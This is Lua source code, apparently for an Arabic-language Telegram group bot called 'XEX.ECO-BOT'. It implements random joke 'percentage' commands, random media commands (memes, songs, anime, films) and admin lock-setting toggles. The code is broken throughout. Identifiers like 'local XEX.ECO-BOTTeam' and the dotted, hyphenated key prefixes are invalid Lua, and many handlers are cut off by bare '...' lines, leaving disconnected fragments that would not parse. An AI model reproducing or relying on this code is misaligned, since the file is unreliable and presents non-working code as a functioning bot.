if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'JNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(XEX.ECO-BOT..'HataNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ☆" and DevALS:get(XEX.ECO-BOT..'HataNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الكره ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'HataNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(XEX.ECO-BOT..'RjolaNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ☆" and DevALS:get(XEX.ECO-BOT..'RjolaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'RjolaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(XEX.ECO-BOT..'AnothaNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ☆" and DevALS:get(XEX.ECO-BOT..'AnothaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'AnothaNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(XEX.ECO-BOT..'StupidNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ☆" and DevALS:get(XEX.ECO-BOT..'StupidNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'StupidNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل حساب العمر'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Age:ALS'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل حساب العمر'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Age:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(XEX.ECO-BOT..'ALS:Age:ALS'..msg.chat_id_) then
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Mean:ALS'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل معاني الاسماء'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Mean:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(XEX.ECO-BOT..'ALS:Mean:ALS'..msg.chat_id_) then
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل المتحركه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:gif:ALS'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل المتحركه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:gif:ALS'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:gif:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1075); 
local Text ='*☆︙تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/gif:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الميمز'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:memz:ALS'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الميمز'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:memz:ALS'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:memz:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1201); 
local Text ='*☆︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/memz:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل غنيلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Audios:ALS'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل غنيلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Audios:ALS'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:Audios:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(4,2824); 
local Text ='*☆︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Song:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الاغاني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:mp3:ALS'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الاغاني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:mp3:ALS'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ☆" or text == "اغاني") and not DevALS:get(XEX.ECO-BOT..'ALS:mp3:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1167); 
local Text ='*☆︙تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/mp3:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الريمكس'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Remix:ALS'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الريمكس'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Remix:ALS'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:Remix:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,612); 
local Text ='*☆︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/remix:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Photo:ALS'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Photo:ALS'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:Photo:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(4,1171); 
local Text ='*☆︙تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/photo:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الانمي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Anime:ALS'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الانمي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Anime:ALS'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:Anime:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(3,1002); 
local Text ='*☆︙تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/anime:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الافلام'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Movies:ALS'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الافلام'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Movies:ALS'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:Movies:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(45,125); 
local Text ='*☆︙تم اختيار الفلم لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Movies:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل المسلسلات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Series:ALS'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل المسلسلات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Series:ALS'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ☆") and not DevALS:get(XEX.ECO-BOT..'ALS:Series:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,54); 
local Text ='*☆︙تم اختيار المسلسل لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/series:"..msg.sender_user_id_}},{{text = '☆ XEX.ECO-BOT Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
--     Source XEX.ECO-BOT     --
if Admin(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الروابط ↫ "..mute_links.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙المعرف ↫ "..lock_tag.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙المتحركه ↫ "..mute_gifs.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الملصقات" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الملصقات ↫ "..lock_sticker.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الصور" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الصور ↫ "..mute_photo.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الفيديو ↫ "..mute_video.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الاونلاين" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙الاونلاين ↫ "..mute_in.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الدردشه" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الدردشه ↫ "..mute_text.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙التوجيه ↫ "..lock_forward.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الاغاني" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الاغاني ↫ "..mute_music.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙الصوت ↫ "..mute_voice.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الجهات ↫ "..lock_contact.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الماركداون" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙الماركداون ↫ "..markdown.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الهاشتاك" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙الهاشتاك ↫ "..lock_htag.."\n"Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "التعديل" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙التعديل ↫ "..mute_edit.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "التثبيت" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙التثبيت ↫ "..lock_pin.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الاشعارات" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الكلايش" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الكلايش ↫ "..lock_spam.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الدخول" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local XEX.ECO-BOTTeam = "\n" .."☆︙الدخول ↫ "..lock_Join.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الشبكات" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الشبكات ↫ "..lock_wp.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "المواقع" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙المواقع ↫ "..lock_location.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "العربيه" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙العربيه ↫ "..lock_arabic.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الانكليزيه" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local XEX.ECO-BOTTeam = "\n" .."☆︙الانكليزيه ↫ "..lock_english.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الكفر" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local XEX.ECO-BOTTeam = "\n" .."☆︙الكفر ↫ "..lock_kaf.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الفشار" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local XEX.ECO-BOTTeam = "\n" .."☆︙الفشار ↫ "..lock_fshar.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
if text == "الطائفيه" then if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local XEX.ECO-BOTTeam = "\n" .."☆︙الطائفيه ↫ "..lock_taf.."\n" Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam, 1, 'md') end
end
--     Source XEX.ECO-BOT     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل كشف الاعدادات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل كشف الاعدادات'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:LockSettings'..msg.chat_id_) 
end
--     Source XEX.ECO-BOT     --
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Robot'..msg.chat_id_)
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Robot'..msg.chat_id_,true)
end
--     Source XEX.ECO-BOT     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل ردود المدير'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل ردود المدير'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:GpRed'..msg.chat_id_,true)
end
--     Source XEX.ECO-BOT     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل ردود المطور'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل ردود المطور'
